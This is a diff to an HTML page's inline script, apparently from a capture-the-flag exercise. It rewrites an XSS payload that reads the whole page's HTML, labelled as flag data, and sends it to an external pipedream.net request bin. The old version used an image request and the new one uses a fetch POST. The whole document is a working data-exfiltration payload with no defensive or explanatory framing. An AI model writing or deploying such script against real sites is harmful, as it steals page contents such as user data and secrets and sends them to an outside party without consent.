@@ -7,12 +7,22 @@
 </head>
 <body>
   <script>
+    // XSS payload to change the title and exfiltrate data
     document.title = 'Payload executed';
     var flagData = document.getElementsByTagName('html')[0].innerHTML;
-        var img = new Image();
-    img.src = 'https://eoue93psy15d0ln.m.pipedream.net' + encodeURIComponent(flagData);
-    img.onerror = function() {
-    };
+    
+    // Send flagData to a request bin using Fetch API
+    fetch('https://eoue93psy15d0ln.m.pipedream.net', {
+      method: 'POST',
+      body: JSON.stringify({ data: flagData }),
+      headers: {
+        'Content-Type': 'application/json'
+      }
+    }).then(response => {
+      // Handle response if needed
+    }).catch(error => {
+      // Handle error if needed
+    });
   </script>
 </body>
 </html>
